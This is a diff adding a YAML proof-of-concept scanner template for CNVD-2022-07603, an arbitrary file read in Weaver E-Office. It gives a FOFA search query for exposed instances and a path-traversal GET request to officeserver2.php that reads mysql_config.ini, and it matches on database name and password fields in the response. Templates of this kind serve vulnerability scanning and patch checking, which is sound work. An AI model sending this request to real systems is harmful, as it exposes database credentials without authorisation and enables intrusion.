@@ -1,0 +1,16 @@
+id: poc-yaml-weaver-e-office-officeserver2-anyfile-read-cnvd-2022-07603
+info:
+  name: 泛微E-Office officeserver2 任意文件读取漏洞(CNVD-2022-07603)
+  severity: high
+  tags:
+  - 任意文件或目录访问
+  - CNVD-2022-07603
+  finger: e-office
+  fofa: app="泛微-EOffice"
+requests:
+- method: GET
+  path: /iweboffice/officeserver2.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini
+  expression: status_code == 200 && contains(body,"<DBSTEP>") && contains(body,"STATUS=IQ==")
+    && contains(body,"dataname =") && contains(body,"datapassword =")
+variables: {}
+transport: http
